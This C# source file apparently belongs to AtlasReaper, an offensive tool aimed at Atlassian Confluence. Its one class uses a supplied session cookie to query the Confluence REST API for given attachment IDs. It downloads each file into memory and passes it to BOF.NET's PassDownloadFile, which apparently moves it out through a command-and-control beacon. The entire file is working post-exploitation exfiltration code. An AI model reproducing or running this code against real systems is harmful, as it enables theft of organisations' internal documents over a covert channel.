using AtlasReaper.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace AtlasReaper.Confluence
{
    internal class DownloadBOFNET
    {
        internal void DownloadAttachmentsThroughBOFNET(ConfluenceOptions.DownloadBOFNETOptions options)
        {
            try
            {
                List<string> attachments = options.Attachments.Split(',').ToList();
                foreach (string attachment in attachments)
                {
                    Utils.WebRequestHandler webRequestHandler = new Utils.WebRequestHandler();
                    string url = options.Url + "/wiki/rest/api/search?cql=type=attachment+AND+Id=" + attachment + "&expand=content.extensions";
                    RootAttachmentsObject attachmentObj = webRequestHandler.GetJson<RootAttachmentsObject>(url, options.Cookie);
                    string downloadUrl = options.Url + "/wiki" + attachmentObj.Results[0].AttachmentContent._ContentLinks.Download;
                    string fileName = attachmentObj.Results[0].AttachmentContent.Title;
                    MemoryStream fileInMemory = webRequestHandler.GetFileInMemory(downloadUrl, options.Cookie);
                    if (fileInMemory != null)
                    {
                        BOFNET.bofnet.PassDownloadFile(fileName, ref fileInMemory);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred while downloading attachments: " + ex.Message);
            }

        }
    }
}
